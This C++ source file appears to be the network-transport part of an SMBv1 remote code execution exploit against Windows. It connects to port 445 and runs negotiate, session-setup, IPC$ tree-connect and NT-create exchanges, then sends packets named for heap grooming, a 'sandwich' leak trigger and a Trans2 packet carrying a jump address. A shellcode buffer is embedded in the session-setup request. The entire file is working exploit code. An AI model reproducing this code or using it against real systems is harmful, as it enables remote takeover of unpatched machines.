#include "smb.h"

#pragma warning(push)
#pragma warning(disable : 6387 6011)

unsigned int TargetConnect(SOCKET& s, sockaddr_in& sa, WSAData& wsa, const char* targetip, unsigned int& status)
{
	typedef unsigned long(__stdcall* PFN_INET_ADDR)(const char* ip);
	s = NULL;
	sa = { 0 };
	wsa = { 0 };
	status = 0;
	HMODULE wsockdll = NULL;
	PFN_INET_ADDR pinet_addr = NULL;

	status = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (status != 0)
		return MAKEUNSIGNED(WSAGetLastError());

	if (notnull(GetModuleHandleW(TEXT("ws2_32"))))
	{
		wsockdll = GetModuleHandleW(TEXT("ws2_32"));
	}
	else
	{
		wsockdll = LoadLibraryW(TEXT("ws2_32.dll"));
	}

	if (isnull(wsockdll))
		return STATUS_INVALID_HANDLE;
	else
		pinet_addr = (PFN_INET_ADDR)GetProcAddress(wsockdll, "inet_addr");

	if (isnull(pinet_addr))
		ExitProcess(STATUS_INVALID_HANDLE);
	else
		sa.sin_addr.s_addr = pinet_addr(targetip);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(445);

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (validsock(s))
	{
		status = connect(s, (sockaddr*)&sa, sizeof(sa));
		if (issockerr(status))
		{
#ifdef _DEBUG
			fwprintf_s(stderr, TEXT("[%ws]:\t error 0x%08x occured when calling \"%ws\"\n"), __FUNCTIONW__, STATUS_FAIL, L"connect()");
			(VOID)SleepEx(2000, FALSE);
			ExitProcess(STATUS_FAIL);
#else
			return MAKEUNSIGNED(STATUS_FAIL);
#endif	//_DEBUG
		}
		else
		{
			*(&status) &= 0;
			status = 0;
			return 0;
		}

	}
	else
	{
		return MAKEUNSIGNED(WSAGetLastError());
	}

	return STATUS_FAIL;

}

unsigned int SendData(BUFFER IN OUT* bws, SOCKET& s, unsigned int& status)
{
	status = 0;

	if (badsock(s))
		return MAKEUNSIGNED(WSAGetLastError());

	*(int*)(&status) = send(s, (const char*)bws->pbdata, *(int*)(&bws->dwsize), 0);
	return status;
}

unsigned int RecvData(BUFFER IN OUT* bws, DWORD IN bufsize, SOCKET& s, unsigned int& status)
{
	bwsalloc(bws, bufsize);
	RtlZeroMemory(bws->pbdata, MAKESIZET(bws->dwsize));

	if (badsock(s))
		return MAKEUNSIGNED(WSAGetLastError());

	*(int*)(&status) = recv(s, (char*)bws->pbdata, *(int*)(&bws->dwsize), 0);
	return status;
}

unsigned int SmbRecvNetbiosSize(SOCKET& s, unsigned int& status)
{
	WORD netbiossize[sizeof(DWORD) / sizeof(WORD)] = { 0 };
	unsigned recvsize[2] = { 0 };
	BYTE recvdata[sizeof(DWORD)] = { 0 };

	if (badsock(s) || !(GetSocket(&s)))
	{
		PutInt(&status, WSAGetLastError());
		PutInt(recvsize, SOCKET_ERROR);
		errmsg(__FUNCSIG__, __LINE__, status);
		return GetUnsigned(recvsize);
	}

	PutInt(recvsize, recv(s, MAKEPCHAR(recvdata), sizeof(DWORD), MSG_PEEK));

	if (issockerr(GetUnsigned(recvsize)) || !(GetUnsigned(recvsize)))
	{
		PutInt(&status, WSAGetLastError());
		PutInt(recvsize, SOCKET_ERROR);
		errmsg(__FUNCSIG__, __LINE__, status);
		return GetUnsigned(recvsize);
	}

	PutUshort(netbiossize, byteswap16(GetUshort(recvdata + NETBIOS_SIZE_OFFSET)));
	PutUshort(netbiossize + 1, GetUshort(recvdata + NETBIOS_SIZE_OFFSET));

	PutInt(&status, 0);

	PutUnsigned(recvsize, MAKEUNSIGNED(*netbiossize + sizeof(DWORD)));
	return GetUnsigned(recvsize);
}

unsigned int SmbRecv(BUFFER IN OUT* bws, SOCKET IN& s)
{
	unsigned status[4] = { 0 }, * error = status + 1, * size = status + 2;

	PutUnsigned(size, SmbRecvNetbiosSize(s, GetUnsigned(status)));

	if (GetUnsigned(status) != 0)
	{
		SetLastError(GetUlong(status));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		return SOCKET_ERROR;
	}

	if (GetUnsigned(size) == 0)
	{
		PutUlong(status, STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		return 0;
	}

	PutUnsigned(status, RecvData(bws, GetUlong(size), s, GetUnsigned(error)));

	if (WSAGetLastError())
		PutInt(error, WSAGetLastError());

	PutUlong(error, ((GetUnsigned(error) == GetUnsigned(status)) ? 0 : GetUlong(error)));

	SetLastError(GetUlong(error));
	return GetUnsigned(status);
}

unsigned int SmbRecvTransaction(ResponsePacketLinkedList IN OUT* responselist, TRANS_RESPONSE_LIST IN OUT* transresponselist, SOCKET& IN s, WORD IN midoftransactiontofind)
{
	ResponsePacketLinkedList* resp = responselist;
	TRANS_RESPONSE_LIST *transentry = transresponselist;
	ANYTRANSACTION_RESPONSE* transaction = NULL;
	unsigned status[2] = { 0 };
	BUFFER* data = NULL;

	while (notnull(resp->ThisPacket.pbdata))
		resp = resp->NextEntry;
	while (notnull(transentry->smb) || notnull(transentry->transaction.pbpointer))
		transentry = transentry->Flink;

	if (GetUlong(&transentry->Blink->smb->Status.NtStatus) & STATUS_FAIL)
	{
		PutUlong(status, GetUlong(&transentry->Blink->smb->Status.NtStatus));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	do
	{
		data = &resp->ThisPacket;
		transaction = &transentry->transaction;

		PutUnsigned(status, SmbRecv(&resp->ThisPacket, s));
		
		if (isnull(resp->ThisPacket.pbdata) || !GetUlong(status) || issockerr(GetUlong(status)))
			goto fail;

		resp->ThisNetbiosSize = data->pbdata + NETBIOS_SIZE_OFFSET;
		resp->ThisSmb = MAKEPSMB(data->pbdata + SMB_HEADER_OFFSET);

		if (!FillInTransResponseEntry(transentry, resp))
		{
			PutUlong(status, ((GetLastError() == 0) ? STATUS_FAIL : GetLastError()));
			errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
			goto fail;
		}

		if (GetUshort(&resp->ThisSmb->Mid) == GetUshort(&midoftransactiontofind))
			break;
		
		resp = resp->NextEntry, transentry = transentry->Flink;
	} 
	while (TRUE);

	if (GetUshort(&resp->ThisSmb->Mid) == midoftransactiontofind)
		goto success;
	else
		goto fail;

success:
	SetLastError(0);
	return GetUnsigned(status);
fail:
	SetLastError(GetUlong(status));
	return 0;
}





BOOLEAN SendRecvNegotiate(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info)
{
	unsigned int sendstatus = 0, & recievestatus = sendstatus;
	BUFFER* srv = (&outbound->ThisPacket), * client = (&inbound->ThisPacket), tmp = { 0 };

	//attempt to make nego request packet fail if it fails
	if (isnull(negotiate_request_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
	{
		errmsg(__FUNCSIG__, __LINE__, STATUS_NO_MEMORY);
		return FALSE;
	}

	// exit loop if socket is invalid
	while (validsock(s))
	{
		//send request
		PutUlong(&sendstatus, SendData(srv, s, sendstatus));

		outbound->ThisSmb = MAKEPSMB(srv->pbdata + 4);
		outbound->ThisNetbiosSize = srv->pbdata + sizeof(WORD);

		if (issockerr(sendstatus) || badsock(s) || ((sendstatus & STATUS_FAIL) == STATUS_FAIL))
		{
			sendstatus = STATUS_FAIL;
			break;
		}

		//recv response
		PutUlong(&recievestatus, RecvData(client, SmbRecvNetbiosSize(s, recievestatus), s, recievestatus));	//PutUlong(&recievestatus, RecvData(client, 0x200, s, recievestatus));

		bwsalloc(&tmp, recievestatus);
		cpy(tmp.pbdata, inbound->ThisPacket.pbdata, tmp.dwsize);
		bwsfree(&inbound->ThisPacket);
		bwsalloc(&inbound->ThisPacket, tmp.dwsize);
		cpy(inbound->ThisPacket.pbdata, tmp.pbdata, inbound->ThisPacket.dwsize);
		bwsfree(&tmp);

		inbound->ThisSmb = MAKEPSMB(srv->pbdata + 4);
		inbound->ThisNetbiosSize = srv->pbdata + 2;
		outbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
		outbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;

		if (issockerr(recievestatus))
		{
			sendstatus = STATUS_FAIL;
			break;
		}
		else
		{
			return TRUE;
		}
	}

	if (sendstatus == STATUS_FAIL)
	{
		goto cleanup;
	}



cleanup:
	if (validsock(s))
		closesocket(s);
	s = INVALID_SOCKET;
	WSACleanup();
	if (notnull(client->pbdata))
		bwsfree(client);
	if (notnull(srv->pbdata))
		bwsfree(srv);
	return FALSE;
}

BOOLEAN SendRecvSessionSetupAndx(RequestPacketLinkedList  OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info, BUFFER IN* shellcode) 
{
	unsigned int sendstatus[2] = { 0 }, & recievestatus = *sendstatus;
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	BOOLEAN retval = 0;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
	{
		SetLastError(STATUS_INVALID_PARAMETER);
		errmsg(__FUNCTION__, __LINE__, GetLastError());
		return FALSE;
	}

	if (badsock(s))
		return FALSE;

	if (isnull(session_setup_packet(srv, shellcode, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
	{
		errmsg(__FUNCSIG__, __LINE__, (GetLastError() == 0) ? STATUS_FAIL : GetLastError());
		return FALSE;
	}

	PutUnsigned(sendstatus, SendData(srv, s, GetUnsigned(sendstatus + 1)));

	if (!GetUlong(sendstatus) || issockerr(GetUlong(sendstatus)))
		return FALSE;

	PutUnsigned(&recievestatus, RecvData(client, SmbRecvNetbiosSize(s, recievestatus), s, recievestatus));	//PutUnsigned(&recievestatus, RecvData(client, 0x200, s, GetUnsigned(sendstatus + 1)));

	if (!GetUlong(&recievestatus) || issockerr(GetUlong(&recievestatus)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(&recievestatus));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);
	inbound->ThisNetbiosSize = MAKEPBYTE(client->pbdata + NETBIOS_SIZE_OFFSET);
	outbound->ThisNetbiosSize = MAKEPBYTE(srv->pbdata + NETBIOS_SIZE_OFFSET);

	return TRUE;
}

BOOLEAN SendRecvTreeConnectAndx(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info, PCWSTR IN ip)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	static UNICODE_STRING wstring, unc; static PWSTR unicodeiptmp;
	WCHAR psztmp[0x100] = { 0 };
	static DWORD i;
	BYTE iparray[4] = { 0 };

	unicodeiptmp = MAKEPWSTR(psztmp);

	wsprintfW(unicodeiptmp, L"\\\\%ws\\IPC$", ip);
	InitUnicodeString(unicodeiptmp, &unc);


	if (isnull(tree_connect_packet(srv, &unc, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
	{
		FreeUnicodeString(&unc);
		return FALSE;
	}



	PutUlong(sendsize, SendData(srv, s, sendsize[1]));

	PutUnsigned(recvsize, RecvData(client, SmbRecvNetbiosSize(s, recvsize[1]), s, recvsize[1]));	//PutUlong(recvsize, RecvData(client, 0x300, s, recvsize[1]));

	if (!cmp(srv->pbdata + 4, "\xFFSMB", 4))
		return FALSE;
	if (!cmp(client->pbdata + 4, "\xFFSMB", 4))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);
	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = MAKEPBYTE(inbound->ThisPacket.pbdata + sizeof(WORD));
	outbound->ThisNetbiosSize = MAKEPBYTE(outbound->ThisPacket.pbdata + sizeof(WORD));
	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + 4);
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + 4);

	if (inbound->ThisSmb->Status.NtStatus & STATUS_FAIL)
		return FALSE;
	else
		return TRUE;
}

BOOLEAN SendRecvNtCreateAndx(RequestPacketLinkedList* OUT outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* IN info)
{
#pragma warning(push)
#pragma warning(disable : 28182)
	BUFFER* client = &inbound->ThisPacket, * srv = &outbound->ThisPacket, tmp = { 0 };
	unsigned int sendstatus = 0, recvstatus[2] = { 0 };

	if (badsock(s) || isnull(info))
		return FALSE;

	if (isnull(nt_create_andx_packet(srv, byteswap16(0), get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUlong(&sendstatus, SendData(srv, s, sendstatus));

	if (sendstatus == 0 || issockerr(sendstatus))
		return FALSE;

	PutUnsigned(recvstatus, RecvData(client, SmbRecvNetbiosSize(s, GetUnsigned(recvstatus + 1)), s, GetUnsigned(recvstatus + 1)));	//PutUlong(&recvstatus, RecvData(client, 0x200, s, recvstatus));

	if (recvstatus == 0 || issockerr(GetUnsigned(recvstatus)))
		return FALSE;

	if (notnull(inbound->ThisPacket.pbdata))
	{
		inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + 4);
		if (inbound->ThisSmb->Status.NtStatus == 0)
		{
			PRESP_NT_CREATE_ANDX presp = (PRESP_NT_CREATE_ANDX)(inbound->ThisPacket.pbdata + 36);
			set_fid(info, presp->Fid);
		}
		else
		{
			set_fid(info, 0);
		}
	}

	bwsalloc(&tmp, GetUlong(&recvstatus));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);


	inbound->ThisNetbiosSize = inbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);

	if (!cmp(client->pbdata + 4, "\xFFSMB", 4))
		return FALSE;

	if (inbound->ThisSmb->Status.NtStatus & STATUS_FAIL)
	{
		SetLastError(GetUlong(&inbound->ThisSmb->Status.NtStatus));
		return FALSE;
	}
#pragma warning(pop)
	return TRUE;
}

BOOLEAN SendRecvTransGroomPacket(RequestPacketLinkedList* OUT outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* IN info)
{
	BUFFER* client = &inbound->ThisPacket, * srv = &outbound->ThisPacket, tmp = { 0 };
	unsigned int sendstatus = 0, recvstatus[2] = { 0 };
	packet_creation_handler_type_one create_packet = &trans_groom_packet;

	if (badsock(s) || isnull(info))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUlong(&sendstatus, SendData(srv, s, sendstatus));

	if (sendstatus == 0 || issockerr(sendstatus))
		return FALSE;

	PutUnsigned(recvstatus, RecvData(client, SmbRecvNetbiosSize(s, GetUnsigned(recvstatus + 1)), s, GetUnsigned(recvstatus + 1)));	//PutUlong(&recvstatus, RecvData(client, 0x200, s, recvstatus));

	if (GetUnsigned(recvstatus) == 0 || issockerr(GetUnsigned(recvstatus)))
		return FALSE;

	inbound->ThisNetbiosSize = inbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);

	if (!cmp(client->pbdata + 4, "\xFFSMB", 4))
	{
		SetLastError(NT_STATUS_INVALID_SMB);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOLEAN SendRecvNtTransNtRename(RequestPacketLinkedList* OUT outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* IN info) 
{
	BUFFER* client = &inbound->ThisPacket, * srv = &outbound->ThisPacket, tmp = { 0 };
	unsigned int sendstatus[2] = { 0 }, recvstatus[2] = { 0 };
	packet_creation_handler_type_one create_packet = &nt_trans_nt_rename_packet;

	if (badsock(s) || isnull(info))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendstatus, SendData(srv, s, GetUnsigned(sendstatus + 1)));

	if (GetUlong(sendstatus) == 0 || issockerr(GetUlong(sendstatus)))
		return FALSE;

	PutUnsigned(recvstatus, RecvData(client, SmbRecvNetbiosSize(s, GetUnsigned(recvstatus + 1)), s, GetUnsigned(recvstatus + 1)));	//PutUlong(&recvstatus, RecvData(client, 0x200, s, recvstatus));

	if (GetUnsigned(recvstatus) == 0 || issockerr(GetUnsigned(recvstatus)))
		return FALSE;

	inbound->ThisNetbiosSize = inbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);

	if (!cmp(client->pbdata + 4, "\xFFSMB", 4))
	{
		SetLastError(NT_STATUS_INVALID_SMB);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOLEAN SendRecvNtTransSecondaryPacketSandwich(RequestPacketLinkedList* OUT outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* IN info)
{
	BUFFER* client = &inbound->ThisPacket, * srv = &outbound->ThisPacket, tmp = { 0 };
	unsigned int sendstatus[2] = { 0 }, recvstatus[2] = { 0 };
	packet_creation_handler_type_one create_packet = &nt_trans_packet_sandwitch_leak_trigger;

	if (badsock(s) || isnull(info))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendstatus, SendData(srv, s, GetUnsigned(sendstatus + 1)));

	if (GetUlong(sendstatus) == 0 || issockerr(GetUlong(sendstatus)))
		return FALSE;

	PutUnsigned(recvstatus, RecvData(client, SmbRecvNetbiosSize(s, GetUnsigned(recvstatus + 1)), s, GetUnsigned(recvstatus + 1)));	//PutUlong(&recvstatus, RecvData(client, 0x200, s, recvstatus));

	if (GetUnsigned(recvstatus) == 0 || issockerr(GetUnsigned(recvstatus)))
		return FALSE;

	inbound->ThisNetbiosSize = inbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);

	if (!cmp(client->pbdata + 4, "\xFFSMB", 4))
	{
		SetLastError(NT_STATUS_INVALID_SMB);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOLEAN SendRecvTrans2QueryPathInfoPacketSandwich(RequestPacketLinkedList* OUT outbound, ResponsePacketLinkedList OUT* inbound, ULONGLONG IN jmp_addr, SOCKET& s, smb_info* IN info)
{
	BUFFER* client = &inbound->ThisPacket, * srv = &outbound->ThisPacket, tmp = { 0 };
	unsigned int sendstatus[2] = { 0 }, recvstatus[2] = { 0 };
	//packet_creation_handler_type_one create_packet = &nt_trans_packet_sandwitch_leak_trigger;

	if (badsock(s) || isnull(info))
		return FALSE;

	if (isnull(trans2_query_path_info_packet_sandwich_packet(srv, jmp_addr, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendstatus, SendData(srv, s, GetUnsigned(sendstatus + 1)));

	if (GetUlong(sendstatus) == 0 || issockerr(GetUlong(sendstatus)))
		return FALSE;

	PutUnsigned(recvstatus, RecvData(client, SmbRecvNetbiosSize(s, GetUnsigned(recvstatus + 1)), s, GetUnsigned(recvstatus + 1)));	//PutUlong(&recvstatus, RecvData(client, 0x200, s, recvstatus));

	if (GetUnsigned(recvstatus) == 0 || issockerr(GetUnsigned(recvstatus)))
		return FALSE;

	inbound->ThisNetbiosSize = inbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);

	if (!cmp(client->pbdata + 4, "\xFFSMB", 4))
	{
		SetLastError(NT_STATUS_INVALID_SMB);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	return TRUE;
}







BOOLEAN SendRecvTreeDisconnect(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &tree_disconnect_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvLogoffAndx(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &logoff_andx_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}